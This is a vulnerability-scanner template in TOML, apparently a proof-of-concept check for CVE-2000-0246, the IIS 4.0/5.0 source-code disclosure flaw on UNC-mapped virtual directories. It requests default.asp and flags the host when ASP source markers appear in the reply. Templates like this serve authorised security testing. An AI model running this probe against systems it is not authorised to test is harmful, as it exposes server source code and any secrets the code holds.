[info]
author = "AVE"
description = "检测 Microsoft IIS 4.0/5.0 UNC 映射虚拟目录源代码泄露漏洞（CVE-2000-0246）。当虚拟目录映射到 UNC 共享时，IIS 未正确处理 ISAPI 扩展，导致远程攻击者可读取 ASP/HTR 等文件源代码。"
id = "POC-AVE-2000-0223"
name = "CVE-2000-0246 PoC"
severity = "medium"
tags = [
    "cve-2000-0246",
    "ave-2000-0223",
]
vuln_id = [
    "CVE-2000-0246",
    "AVE-2000-0223",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/default.asp"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "Response.Write",
    "Server.CreateObject",
    "<%@",
]

